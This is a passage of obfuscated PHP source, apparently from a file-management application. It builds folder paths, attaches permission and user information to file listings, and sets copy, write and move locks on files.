Model($à£±—Í[409])->listData(); $ÈõÈ…š  = Model($à£±—Í[469])->listSimple(); $ÄØ•œñØ = array_to_keyvalue($¹Ê‚€×„, $à£±—Í[394]); $½Øø¸¦¥ = array_to_keyvalue_group($Ê§¬¥Ã°, $à£±—Í[78], $à£±—Í[420]); $ˆ’¢Ü = array_to_keyvalue($€ÈªäË, $à£±—Í[78]); $ºº–íû = array_to_keyvalue_group($ÈõÈ…š , $à£±—Í[396]); foreach ($òí¤¡Ğï as &$¸ ×ÔÂõ) { $¸ ×ÔÂõ[$à£±—Í[87]] = array($à£±—Í[470] => 0, $à£±—Í[471] => 0, $à£±—Í[472] => 0); if (isset($ˆ’¢Ü[$¸ ×ÔÂõ[$à£±—Í[396]]])) { $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[473]] = 1; $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[474]] = $ˆ’¢Ü[$¸ ×ÔÂõ[$à£±—Í[396]]][$à£±—Í[32]]; } if (isset($½Øø¸¦¥[$¸ ×ÔÂõ[$à£±—Í[396]]])) { $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[475]] = array(); foreach ($½Øø¸¦¥[$¸ ×ÔÂõ[$à£±—Í[396]]] as $€‚ã§ø·) { $ìÃŸƒ™§ = $ÄØ•œñØ[$€‚ã§ø·]; $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[475]][] = array($à£±—Í[476] => $ìÃŸƒ™§[$à£±—Í[394]], $à£±—Í[414] => $ìÃŸƒ™§[$à£±—Í[32]], $à£±—Í[477] => $ìÃŸƒ™§[$à£±—Í[478]]); } } if (isset($ºº–íû[$¸ ×ÔÂõ[$à£±—Í[396]]])) { $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[479]] = array(); foreach ($ºº–íû[$¸ ×ÔÂõ[$à£±—Í[396]]] as $òƒÕóÑŞ) { $¸ ×ÔÂõ[$à£±—Í[87]][$à£±—Í[479]] = array($à£±—Í[480] => $òƒÕóÑŞ[$à£±—Í[481]], $à£±—Í[482] => $òƒÕóÑŞ[$à£±—Í[483]], $à£±—Í[484] => $òƒÕóÑŞ[$à£±—Í[396]], $à£±—Í[485] => $òƒÕóÑŞ[$à£±—Í[486]], $à£±—Í[487] => $òƒÕóÑŞ[$à£±—Í[488]], $à£±—Í[489] => $òƒÕóÑŞ[$à£±—Í[489]], $à£±—Í[490] => $òƒÕóÑŞ[$à£±—Í[490]]); } } } unset($¸ ×ÔÂõ); return $òí¤¡Ğï; } protected function _listAppendChildren(&$«Ü¥ëÓÑ, $´¹‰©¹ê) { $¨Øˆİıú =& $_SERVER[ê‘³Æ±]; $¶’İŸ¤› = array(); $”ó‘àõ = array($¨Øˆİıú[204] => 0, $¨Øˆİıú[205] => 0); foreach ($«Ü¥ëÓÑ as &$ùƒß») { if (!$ùƒß»[$¨Øˆİıú[404]]) { continue; } $¶’İŸ¤›[] = $ùƒß»[$¨Øˆİıú[396]]; } unset($ùƒß»); if (!$¶’İŸ¤›) { return; } $¸£Î÷ÁÙ = array($¨Øˆİıú[491] => array($¨Øˆİıú[7], $¶’İŸ¤›)); $ØË§à÷ = array($¨Øˆİıú[491], $¨Øˆİıú[404], $¨Øˆİıú[492] => $¨Øˆİıú[493]); $£­“ñˆş = $this->field($ØË§à÷)->where($¸£Î÷ÁÙ)->group($¨Øˆİıú[494])->select(); $—š™‰¹ = array(); foreach ($£­“ñˆş as $ŒÚ½›–ğ) { $›“ªÙÎÙ = $ŒÚ½›–ğ[$¨Øˆİıú[491]]; $‡±‰¾² = $ŒÚ½›–ğ[$¨Øˆİıú[404]] == $¨Øˆİıú[89] ? $¨Øˆİıú[205] : $¨Øˆİıú[204]; if (!isset($—š™‰¹[$›“ªÙÎÙ])) { $—š™‰¹[$›“ªÙÎÙ] = array($¨Øˆİıú[204] => 0, $¨Øˆİıú[205] => 0); } $—š™‰¹[$›“ªÙÎÙ][$‡±‰¾²] += $ŒÚ½›–ğ[$¨Øˆİıú[493]]; } foreach ($«Ü¥ëÓÑ as &$ùƒß») { if (!$ùƒß»[$¨Øˆİıú[404]]) { continue; } $ãšŞÉÓş = is_array($—š™‰¹[$ùƒß»[$¨Øˆİıú[396]]]) ? $—š™‰¹[$ùƒß»[$¨Øˆİıú[396]]] : $”ó‘àõ; $ùƒß»[$¨Øˆİıú[205]] = $ãšŞÉÓş[$¨Øˆİıú[205]]; $ùƒß»[$¨Øˆİıú[204]] = $ãšŞÉÓş[$¨Øˆİıú[204]]; unset($ùƒß»[$¨Øˆİıú[406]]); } unset($ùƒß»); } protected function _listAppendAuth(&$œ©îÛè) { $»Í‚óìò =& $_SERVER[ê‘³Æ±]; if (!defined($»Í‚óìò[467])) { return; } $…¢ÕÌŞ‘ = array(); foreach ($œ©îÛè as $¾ä”‡åÎ) { if ($¾ä”‡åÎ[$»Í‚óìò[405]] == self::TYPE_GROUP) { $…¢ÕÌŞ‘[] = $¾ä”‡åÎ[$»Í‚óìò[396]]; } } if (!$…¢ÕÌŞ‘) { return; } $äûô¢òè = array_to_keyvalue($œ©îÛè, $»Í‚óìò[396]); $æ®îì‡ = Model($»Í‚óìò[495])->getSourceList($…¢ÕÌŞ‘, $äûô¢òè); $ñæ©¹³¯ = $GLOBALS[$»Í‚óìò[496]] == 1; foreach ($œ©îÛè as $ËÊ¬ï¼¸ => &$¾ä”‡åÎ) { $¾ä”‡åÎ[$»Í‚óìò[407]] = $æ®îì‡[$¾ä”‡åÎ[$»Í‚óìò[396]]]; if (!$¾ä”‡åÎ[$»Í‚óìò[407]] && $¾ä”‡åÎ[$»Í‚óìò[405]] == self::TYPE_GROUP) { $¾ä”‡åÎ[$»Í‚óìò[407]] = Action($»Í‚óìò[497])->pathGroupAuthMake($¾ä”‡åÎ[$»Í‚óìò[498]]); if (!$¾ä”‡åÎ[$»Í‚óìò[407]] && !$ñæ©¹³¯) { $¾ä”‡åÎ[$»Í‚óìò[197]] = !1; $¾ä”‡åÎ[$»Í‚óìò[196]] = !1; } } if ($¾ä”‡åÎ[$»Í‚óìò[407]]) { $¾ä”‡åÎ[$»Í‚óìò[197]] = AuthModel::authCheckEdit($¾ä”‡åÎ[$»Í‚óìò[407]][$»Í‚óìò[408]]); $¾ä”‡åÎ[$»Í‚óìò[196]] = AuthModel::authCheckView($¾ä”‡åÎ[$»Í‚óìò[407]][$»Í‚óìò[408]]); } $this->groupPathDisplay($¾ä”‡åÎ); } unset($¾ä”‡åÎ); } public function _listAppendAuthSecret(&$ºªÎìÅ¹) { $Ö– ¼ˆº =& $_SERVER[ê‘³Æ±]; if (Model($Ö– ¼ˆº[426])->get($Ö– ¼ˆº[499]) != $Ö– ¼ˆº[89]) { return; } static $’˜™öÈ‰ = false; if (!$’˜™öÈ‰) { $ÌåæÆ¿ = Model($Ö– ¼ˆº[500]); $ÛºÚ‘ÏÀ = Model($Ö– ¼ˆº[501]); $’˜™öÈ‰ = $ÛºÚ‘ÏÀ->listData(); $’˜™öÈ‰ = array_to_keyvalue($’˜™öÈ‰, $Ö– ¼ˆº[396]); $İ¯“½… = json_decode(Model($Ö– ¼ˆº[426])->get($Ö– ¼ˆº[502]), !0); $İ¯“½… = array_to_keyvalue($İ¯“½…, $Ö– ¼ˆº[394]); foreach ($’˜™öÈ‰ as $¹¼æãõú => $ÜÛ×ØÆ) { $ô¯ëâßš = $İ¯“½…[$ÜÛ×ØÆ[$Ö– ¼ˆº[503]]]; if (!$ô¯ëâßš) { $ÛºÚ‘ÏÀ->remove($ÜÛ×ØÆ[$Ö– ¼ˆº[394]]); unset($’˜™öÈ‰[$¹¼æãõú]); continue; } $èğŠ„ÃÕ = $ÌåæÆ¿->listData($ô¯ëâßš[$Ö– ¼ˆº[407]]); if (!$èğŠ„ÃÕ) { $ÛºÚ‘ÏÀ->remove($ÜÛ×ØÆ[$Ö– ¼ˆº[394]]); unset($’˜™öÈ‰[$¹¼æãõú]); continue; } $ÜÛ×ØÆ[$Ö– ¼ˆº[407]] = $èğŠ„ÃÕ; $ÜÛ×ØÆ[$Ö– ¼ˆº[504]] = $ô¯ëâßš; $ÜÛ×ØÆ[$Ö– ¼ˆº[505]] = Model($Ö– ¼ˆº[506])->getInfoSimpleOuter($ÜÛ×ØÆ[$Ö– ¼ˆº[445]]); $’˜™öÈ‰[$¹¼æãõú] = $ÜÛ×ØÆ; } } $åóåÄôÌ = defined($Ö– ¼ˆº[507]) ? USER_ID : $Ö– ¼ˆº[12]; $­ÙÃ†åì = array(); $¾ïÇ£ì = $this->_listAppendPath($­ÙÃ†åì, !0); foreach ($ºªÎìÅ¹ as $¹¼æãõú => &$ÜÛ×ØÆ) { if (!is_array($ÜÛ×ØÆ[$Ö– ¼ˆº[407]])) { continue; } if ($ÜÛ×ØÆ[$Ö– ¼ˆº[405]] != $Ö– ¼ˆº[508]) { continue; } if (isset($’˜™öÈ‰[$ÜÛ×ØÆ[$Ö– ¼ˆº[396]]])) { $Õşşìì = $’˜™öÈ‰[$ÜÛ×ØÆ[$Ö– ¼ˆº[396]]]; if (!is_array($ÜÛ×ØÆ[$Ö– ¼ˆº[458]])) { $ÜÛ×ØÆ[$Ö– ¼ˆº[458]] = array(); } $ÜÛ×ØÆ[$Ö– ¼ˆº[458]][$Ö– ¼ˆº[509]] = $Õşşìì[$Ö– ¼ˆº[503]]; $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[510]] = $Õşşìì; $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[511]] = $ÜÛ×ØÆ[$Ö– ¼ˆº[512]]; $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[513]] = $Ö– ¼ˆº[89]; if ($Õşşìì[$Ö– ¼ˆº[445]] != $åóåÄôÌ) { $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[408]] = $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[408]] & $Õşşìì[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[407]]; } continue; } $¡ëó¬´Ï = $this->parentLevelArray($ÜÛ×ØÆ[$Ö– ¼ˆº[514]]); $Öäù¹Âš = array_reverse($¡ëó¬´Ï); foreach ($Öäù¹Âš as $¬ÖŠ‚Êà => $†›˜€´) { if (!isset($’˜™öÈ‰[$†›˜€´])) { continue; } $Õşşìì = $’˜™öÈ‰[$†›˜€´]; $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[510]] = $Õşşìì; if ($Õşşìì[$Ö– ¼ˆº[445]] != $åóåÄôÌ) { $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[408]] = $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[408]] & $Õşşìì[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[407]]; } $ÊÌáĞì = $Ö– ¼ˆº[12]; $Ì÷¬“‚„ = count($¡ëó¬´Ï) - $¬ÖŠ‚Êà; for ($é†ãàÀø = 0; $é†ãàÀø < $Ì÷¬“‚„; $é†ãàÀø++) { if (!isset($¾ïÇ£ì[$¡ëó¬´Ï[$é†ãàÀø]])) { $ÊÌáĞì = $Ö– ¼ˆº[12]; break; } $ÊÌáĞì = $ÊÌáĞì . rtrim($¾ïÇ£ì[$¡ëó¬´Ï[$é†ãàÀø]], $Ö– ¼ˆº[8]) . $Ö– ¼ˆº[8]; } $ÜÛ×ØÆ[$Ö– ¼ˆº[407]][$Ö– ¼ˆº[511]] = rtrim($ÊÌáĞì, $Ö– ¼ˆº[8]) . $Ö– ¼ˆº[8]; break; } } unset($ÜÛ×ØÆ); } public function groupPathDisplay(&$š­õïİ—) { $Éäúåú³ =& $_SERVER[ê‘³Æ±]; if ($š­õïİ—[$Éäúåú³[405]] != self::TYPE_GROUP) { return; } $ıÔ¤ø°‡ = Model($Éäúåú³[515])->getInfo($š­õïİ—[$Éäúåú³[498]]); $€å¦®¸Ò = $this->parentLevelArray($ıÔ¤ø°‡[$Éäúåú³[514]]); $£ÖÌÇœÒ = $Éäúåú³[12]; foreach ($€å¦®¸Ò as $˜¶ó½Í) { $–¦ÚƒºÆ = Model($Éäúåú³[515])->getInfo($˜¶ó½Í); $£ÖÌÇœÒ .= $–¦ÚƒºÆ[$Éäúåú³[87]][$Éäúåú³[396]] . $Éäúåú³[50]; } $š­õïİ—[$Éäúåú³[516]] = $ıÔ¤ø°‡[$Éäúåú³[491]]; $š­õïİ—[$Éäúåú³[517]] = $ıÔ¤ø°‡[$Éäúåú³[514]]; $š­õïİ—[$Éäúåú³[518]] = $ıÔ¤ø°‡[$Éäúåú³[519]]; $š­õïİ—[$Éäúåú³[520]] = $£ÖÌÇœÒ . $ıÔ¤ø°‡[$Éäúåú³[87]][$Éäúåú³[396]]; } protected function _listAppendPath(&$‚ÄÌĞµÏ, $Ú×ª£„ƒ = false) { $á˜™Üœ =& $_SERVER[ê‘³Æ±]; static $•œöé•İ = array(); $ĞÜëèĞï = array(); $ö†åï¬Û = array(); if ($Ú×ª£„ƒ) { return $•œöé•İ; } foreach ($‚ÄÌĞµÏ as &$ó±Ê×§â) { $¼ğâ‚ = $ó±Ê×§â[$á˜™Üœ[396]]; if ($ó±Ê×§â[$á˜™Üœ[404]] == $á˜™Üœ[89] && $ó±Ê×§â[$á˜™Üœ[491]] != 0) { $•œöé•İ[$¼ğâ‚] = $ó±Ê×§â[$á˜™Üœ[32]]; } if ($ó±Ê×§â[$á˜™Üœ[404]] == $á˜™Üœ[89] && $ó±Ê×§â[$á˜™Üœ[491]] == 0 && !isset($•œöé•İ[$¼ğâ‚])) { $•œöé•İ[$¼ğâ‚] = $this->_listAppendPathRoot($ó±Ê×§â, array()); } if (isset($ö†åï¬Û[$ó±Ê×§â[$á˜™Üœ[514]]])) { continue; } $ö†åï¬Û[$ó±Ê×§â[$á˜™Üœ[514]]] = !0; $ŞëˆÖÃ = $this->parentLevelArray($ó±Ê×§â[$á˜™Üœ[514]]); foreach ($ŞëˆÖÃ as $·¼‘†İ => $æÓşà¿) { if (isset($•œöé•İ[$æÓşà¿])) { continue; } if ($·¼‘†İ == 0) { $•œöé•İ[$æÓşà¿] = $this->_listAppendPathRoot($ó±Ê×§â, $ŞëˆÖÃ); } if ($·¼‘†İ != 0) { $ĞÜëèĞï[] = $æÓşà¿; } } } unset($ó±Ê×§â); $ĞÜëèĞï = array_unique($ĞÜëèĞï); if (count($ĞÜëèĞï) > 0) { $€”„£‡Æ = array($á˜™Üœ[411] => array($á˜™Üœ[412], $ĞÜëèĞï)); if (count($ĞÜëèĞï) == 1) { $ãšÓÆª = $this->sourceInfo($ĞÜëèĞï[0]); $ŞóÁ°Ï = is_array($ãšÓÆª) ? array($ãšÓÆª) : !1; } else { $ŞóÁ°Ï = $this->field($á˜™Üœ[521])->where($€”„£‡Æ)->select(); } if (!$ŞóÁ°Ï) { $ŞóÁ°Ï = array(); } foreach ($ŞóÁ°Ï as $ö²Õ¥ÓÏ) { $•œöé•İ[$ö²Õ¥ÓÏ[$á˜™Üœ[396]]] = $ö²Õ¥ÓÏ[$á˜™Üœ[32]]; } } $¯”°¤¿™ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¡¿·´¿È = array(); foreach ($‚ÄÌĞµÏ as &$ó±Ê×§â) { $æã÷ö²½ = $ó±Ê×§â[$á˜™Üœ[514]]; $öó´ª†± = $á˜™Üœ[12]; if (isset($¡¿·´¿È[$æã÷ö²½])) { $öó´ª†± = $¡¿·´¿È[$æã÷ö²½]; } else { $ŞëˆÖÃ = $this->parentLevelArray($ó±Ê×§â[$á˜™Üœ[514]]); foreach ($ŞëˆÖÃ as $·¼‘†İ => $æÓşà¿) { if (isset($•œöé•İ[$æÓşà¿])) { $öó´ª†± .= $•œöé•İ[$æÓşà¿] . $á˜™Üœ[8]; } } $¡¿·´¿È[$æã÷ö²½] = $öó´ª†±; } $öó´ª†± .= $ó±Ê×§â[$á˜™Üœ[32]]; if ($ó±Ê×§â[$á˜™Üœ[404]] == $á˜™Üœ[89]) { $öó´ª†± .= $á˜™Üœ[8]; } $ó±Ê×§â[$á˜™Üœ[512]] = str_replace($á˜™Üœ[522], $á˜™Üœ[8], $öó´ª†±); if ($ó±Ê×§â[$á˜™Üœ[491]] == $á˜™Üœ[192]) { $ó±Ê×§â[$á˜™Üœ[32]] = trim($•œöé•İ[$ó±Ê×§â[$á˜™Üœ[396]]], $á˜™Üœ[8]); $ó±Ê×§â[$á˜™Üœ[512]] = $ó±Ê×§â[$á˜™Üœ[32]] . $á˜™Üœ[8]; } if (intval($ó±Ê×§â[$á˜™Üœ[405]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ó±Ê×§â, $ŞëˆÖÃ, $¯”°¤¿™); } } unset($ó±Ê×§â); return $‚ÄÌĞµÏ; } private function _listAppendPathRecycle(&$Û™¨ïíö, $çéı»Êµ, $¶¿¹ÕüÒ) { $×Ú—éİƒ =& $_SERVER[ê‘³Æ±]; if (!in_array($¶¿¹ÕüÒ, $çéı»Êµ) && $Û™¨ïíö[$×Ú—éİƒ[396]] != $¶¿¹ÕüÒ) { return; } $»’Æ•òâ = explode($×Ú—éİƒ[8], trim($Û™¨ïíö[$×Ú—éİƒ[512]], $×Ú—éİƒ[8])); $àúü•…Ï = implode($×Ú—éİƒ[8], array_slice($»’Æ•òâ, 2)); $Û™¨ïíö[$×Ú—éİƒ[512]] = $×Ú—éİƒ[8] . LNG($×Ú—éİƒ[523]) . $×Ú—éİƒ[8] . ltrim($àúü•…Ï, $×Ú—éİƒ[8]); $Û™¨ïíö[$×Ú—éİƒ[514]] = $×Ú—éİƒ[524] . implode($×Ú—éİƒ[50], array_slice($çéı»Êµ, 1)) . $×Ú—éİƒ[50]; if ($Û™¨ïíö[$×Ú—éİƒ[396]] == $¶¿¹ÕüÒ) { $Û™¨ïíö[$×Ú—éİƒ[514]] = $×Ú—éİƒ[524]; $Û™¨ïíö[$×Ú—éİƒ[491]] = $×Ú—éİƒ[192]; $Û™¨ïíö[$×Ú—éİƒ[32]] = LNG($×Ú—éİƒ[523]); } $Û™¨ïíö[$×Ú—éİƒ[525]] = $×Ú—éİƒ[526]; } protected function _listAppendPathRoot(&$ıñÚº“Ò, $¼ô‘Éã») { $ˆä·¢¢ñ =& $_SERVER[ê‘³Æ±]; $’ñ•êÅê = $ˆä·¢¢ñ[12]; if ($ıñÚº“Ò[$ˆä·¢¢ñ[405]] == self::TYPE_USER) { if (defined($ˆä·¢¢ñ[467]) && $ıñÚº“Ò[$ˆä·¢¢ñ[498]] == USER_ID) { $’ñ•êÅê = LNG($ˆä·¢¢ñ[527]); if (!$¼ô‘Éã») { $ıñÚº“Ò[$ˆä·¢¢ñ[32]] = $’ñ•êÅê; } } else { $¾„¿æÍŠ = Model($ˆä·¢¢ñ[506])->getInfoSimple($ıñÚº“Ò[$ˆä·¢¢ñ[498]]); $’ñ•êÅê = LNG($ˆä·¢¢ñ[528]) . $ˆä·¢¢ñ[161] . $¾„¿æÍŠ[$ˆä·¢¢ñ[32]] . $ˆä·¢¢ñ[529]; $ıñÚº“Ò[$ˆä·¢¢ñ[530]] = array($ˆä·¢¢ñ[32] => $¾„¿æÍŠ[$ˆä·¢¢ñ[32]], $ˆä·¢¢ñ[531] => $¾„¿æÍŠ[$ˆä·¢¢ñ[531]], $ˆä·¢¢ñ[532] => $¾„¿æÍŠ[$ˆä·¢¢ñ[532]]); } } else { if ($ıñÚº“Ò[$ˆä·¢¢ñ[405]] == self::TYPE_GROUP) { $¾„¿æÍŠ = Model($ˆä·¢¢ñ[515])->getInfoSimple($ıñÚº“Ò[$ˆä·¢¢ñ[498]]); $’ñ•êÅê = $¾„¿æÍŠ[$ˆä·¢¢ñ[32]]; } else { if ($ıñÚº“Ò[$ˆä·¢¢ñ[405]] == self::TYPE_SYSTEM) { $’ñ•êÅê = $ˆä·¢¢ñ[533]; } } } $’ñ•êÅê = $’ñ•êÅê ? $ˆä·¢¢ñ[8] . $’ñ•êÅê . $ˆä·¢¢ñ[8] : $ˆä·¢¢ñ[8]; return $’ñ•êÅê; } protected function _listAppendUser(&$ãÖâÜã) { $×¡Üè¯ª =& $_SERVER[ê‘³Æ±]; $üÇæµŞ‡ = array_to_keyvalue($ãÖâÜã, $×¡Üè¯ª[12], $×¡Üè¯ª[445]); $¥äœ›Ç = array_to_keyvalue($ãÖâÜã, $×¡Üè¯ª[12], $×¡Üè¯ª[447]); $¨º¼ÔÑ´ = array_merge($üÇæµŞ‡, $¥äœ›Ç); $¨æåÖÉï = Model($×¡Üè¯ª[534])->userListInfo($¨º¼ÔÑ´); foreach ($ãÖâÜã as &$ş¸®‰àï) { $‚ıŸôíº = $ş¸®‰àï[$×¡Üè¯ª[445]]; $ş¸®‰àï[$×¡Üè¯ª[445]] = $¨æåÖÉï[$‚ıŸôíº] ? $¨æåÖÉï[$‚ıŸôíº] : !1; $‚ıŸôíº = $ş¸®‰àï[$×¡Üè¯ª[447]]; $ş¸®‰àï[$×¡Üè¯ª[447]] = $¨æåÖÉï[$‚ıŸôíº] ? $¨æåÖÉï[$‚ıŸôíº] : !1; if (isset($ş¸®‰àï[$×¡Üè¯ª[458]]) && $ş¸®‰àï[$×¡Üè¯ª[458]][$×¡Üè¯ª[535]]) { $‰¾°¹ó³ = $GLOBALS[$×¡Üè¯ª[6]][$×¡Üè¯ª[90]][$×¡Üè¯ª[536]]; if ($ş¸®‰àï[$×¡Üè¯ª[458]][$×¡Üè¯ª[537]] <= time() - $‰¾°¹ó³) { $this->metaSet($ş¸®‰àï[$×¡Üè¯ª[396]], $×¡Üè¯ª[535], null); $this->metaSet($ş¸®‰àï[$×¡Üè¯ª[396]], $×¡Üè¯ª[537], null); unset($ş¸®‰àï[$×¡Üè¯ª[458]][$×¡Üè¯ª[535]]); continue; } $õ…±ÄÓÄ = $ş¸®‰àï[$×¡Üè¯ª[458]][$×¡Üè¯ª[535]]; $ş¸®‰àï[$×¡Üè¯ª[458]][$×¡Üè¯ª[538]] = Model($×¡Üè¯ª[534])->getInfoSimpleOuter($õ…±ÄÓÄ); } } unset($ş¸®‰àï); } public function parentLevelArray($€ı‚ÎÚÑ) { $ÆöüªÊ =& $_SERVER[ê‘³Æ±]; $€ı‚ÎÚÑ = explode($ÆöüªÊ[50], trim($€ı‚ÎÚÑ, $ÆöüªÊ[50])); return array_remove_value($€ı‚ÎÚÑ, $ÆöüªÊ[192]); } public function listAll($¥«Æ ¦×) { $×ı£“ =& $_SERVER[ê‘³Æ±]; $ÎÊ×è™¤ = $this->sourceInfo($¥«Æ ¦×); $¿å¥ş¿Ã = array($×ı£“[539] => array($×ı£“[540], $ÎÊ×è™¤[$×ı£“[514]] . $¥«Æ ¦× . $×ı£“[541]), $×ı£“[542] => 0); $¯’Ãá‘š = $×ı£“[543]; $°°¡´ŒÔ = "\114\x45\x46\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\146\151\154\145\40\x66\x69\154\x65\x20\x6f\x6e\x20\x73\x6f\x75\x72\143\x65\56\146\x69\x6c\x65\x49\104\x20\x3d\40\146\x69\x6c\145\56\146\151\x6c\x65\111\104"; $µ÷¦ç¸‹ = $this->alias($×ı£“[437])->field($¯’Ãá‘š)->where($¿å¥ş¿Ã)->join($°°¡´ŒÔ)->select(); $this->_listAppendAuth($µ÷¦ç¸‹); $this->_listAppendUser($µ÷¦ç¸‹); $this->_listAppendPath($µ÷¦ç¸‹); $µ÷¦ç¸‹ = array_to_keyvalue($µ÷¦ç¸‹, $×ı£“[396]); $İóààäœ = "\57{$ÎÊ×è™¤[$×ı£“[32]]}\57"; $İóààäœ = $İóààäœ == $×ı£“[522] ? $×ı£“[8] : $İóààäœ; $õ…Şü´³ = array(); foreach ($µ÷¦ç¸‹ as $¶…¨ş¾Ö => $–½Œî„¬) { $ƒü†§Ÿ÷ = $this->parentLevelArray($–½Œî„¬[$×ı£“[514]]); array_shift($ƒü†§Ÿ÷); $Ï”‰·Å = $İóààäœ; for ($ßÂúıé¯ = 0; $ßÂúıé¯ < count($ƒü†§Ÿ÷); $ßÂúıé¯++) { $Ï”‰·Å .= $µ÷¦ç¸‹[$ƒü†§Ÿ÷[$ßÂúıé¯]][$×ı£“[32]] . $×ı£“[8]; } $Ï”‰·Å .= $–½Œî„¬[$×ı£“[32]]; if ($–½Œî„¬[$×ı£“[404]]) { $Ï”‰·Å .= $×ı£“[8]; } $Ï”‰·Å = str_replace($×ı£“[522], $×ı£“[8], $Ï”‰·Å); $Ï”‰·Å = str_replace($×ı£“[522], $×ı£“[8], $Ï”‰·Å); $½ÃêÇ–£ = array($×ı£“[415] => str_replace($×ı£“[522], $×ı£“[8], $Ï”‰·Å), $×ı£“[544] => intval($–½Œî„¬[$×ı£“[404]]), $×ı£“[87] => $this->pathInfoFilter($–½Œî„¬)); if (!$–½Œî„¬[$×ı£“[404]]) { $½ÃêÇ–£[$×ı£“[460]] = $–½Œî„¬[$×ı£“[460]]; $½ÃêÇ–£[$×ı£“[88]] = $–½Œî„¬[$×ı£“[78]]; } $õ…Şü´³[] = $½ÃêÇ–£; } return $õ…Şü´³; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÛšúÚá) { $îèÆ‹¥  =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($îèÆ‹¥ [545], $ÛšúÚá); $Àïåõî = 1; $this->_lockEvent($ÛšúÚá, array($îèÆ‹¥ [546], $îèÆ‹¥ [547]), $Àïåõî); $this->_lockParent($ÛšúÚá, array($îèÆ‹¥ [547]), $Àïåõî); $this->_lockEvent($ÛšúÚá, array($îèÆ‹¥ [548], $îèÆ‹¥ [549]), $Àïåõî); $this->_lockCheckEnd($îèÆ‹¥ [545], $ÛšúÚá); } public function lockCopyEnd($ÓÏò‘œ) { $Ñ†èœ‚³ =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $‡ÑÒœè = 0; $this->_lockEvent($ÓÏò‘œ, array($Ñ†èœ‚³[546], $Ñ†èœ‚³[547]), $‡ÑÒœè); $this->_lockParent($ÓÏò‘œ, array($Ñ†èœ‚³[547]), $‡ÑÒœè); $this->_lockEvent($ÓÏò‘œ, array($Ñ†èœ‚³[548], $Ñ†èœ‚³[549]), $‡ÑÒœè); } public function lockWriteStart($µËœÍ«, $‘Ğ×Ä­İ = '') { $Ñ¬§ËÖî =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ñ¬§ËÖî[546], $µËœÍ«); $œ¹Ñ£Ó¾ = 1; $this->_lockKey($Ñ¬§ËÖî[550] . $µËœÍ« . $Ñ¬§ËÖî[10] . $‘Ğ×Ä­İ, $œ¹Ñ£Ó¾); $this->_lockEvent($µËœÍ«, array($Ñ¬§ËÖî[545], $Ñ¬§ËÖî[547]), $œ¹Ñ£Ó¾); $this->_lockParent($µËœÍ«, array($Ñ¬§ËÖî[545], $Ñ¬§ËÖî[547]), $œ¹Ñ£Ó¾); $this->_lockCheckEnd($Ñ¬§ËÖî[546], $µËœÍ«); } public function lockWriteEnd($¥¯š“®³, $åÃ²Ï‘¹ = '') { $Ş©’ÁêŸ =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $¢Ó“³ = 0; $this->_lockKey($Ş©’ÁêŸ[550] . $¥¯š“®³ . $Ş©’ÁêŸ[10] . $åÃ²Ï‘¹, $¢Ó“³); $this->_lockEvent($¥¯š“®³, array($Ş©’ÁêŸ[545], $Ş©’ÁêŸ[547]), $¢Ó“³); $this->_lockParent($¥¯š“®³, array($Ş©’ÁêŸ[545], $Ş©’ÁêŸ[547]), $¢Ó“³); } public function lockMoveStart($¶òƒÂÒ) { $‡”®Àªú =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡”®Àªú[547], $¶òƒÂÒ); $Øì¨‰  = 1; $this->_lockKey($‡”®Àªú[551] . $¶òƒÂÒ, $Øì¨‰ ); $this->_lockEvent($¶òƒÂÒ, array($‡”®Àªú[545], $‡”®Àªú[546]), $Øì¨‰ ); $this->_lockParent($¶òƒÂÒ, array($‡”®Àªú[545], $‡”®Àªú[547]), $Øì¨‰ ); $this->_lockEvent($¶òƒÂÒ, array($‡”®Àªú[552], $‡”®Àªú[548], $‡”®Àªú[549]), $Øì¨‰ ); $this->_lockCheckEnd($‡”®Àªú[547], $¶òƒÂÒ); } public function lockMoveEnd($«é´­¸”) { $õœ©“‡ü =& $_SERVER[ê‘³Æ±]; if (!$this->allowLock()) { return; } $úºÓâ× = 0; $this->_lockKey($õœ©“‡ü[551] . $«é´­¸”, $úºÓâ×); $this->_lockEvent($«é´­¸”, array($õœ©“‡ü[545], $õœ©“‡ü[546]), $úºÓâ×); $this->_lockParent($«é´­¸”, array($õœ©“‡ü[545], $õœ©“‡ü[547]), $úºÓâ×); $this->_lockEvent($«é´­¸”, array($õœ©“‡ü[552], $õœ©“‡ü[548], $õœ©“‡ü[549]), $úºÓâ×); } private function _lockCheck($İÁ£Ö³ã, $Öå¾ğá) { $é¸‹­Ïç =& $_SERVER[ê‘³Æ±]; $´áÙ”’Å = $this->sourceInfo($Öå¾ğá); $µ¾±± = $İÁ£Ö³ã . $é¸‹­Ïç[10] . $Öå¾ğá; $this->_lockTimeStart[$µ¾±±] = timeFloat(); if (!is_array($´áÙ”’Å)) { return; } $¸÷ŒÆüõ = LNG($é¸‹­Ïç[553]); 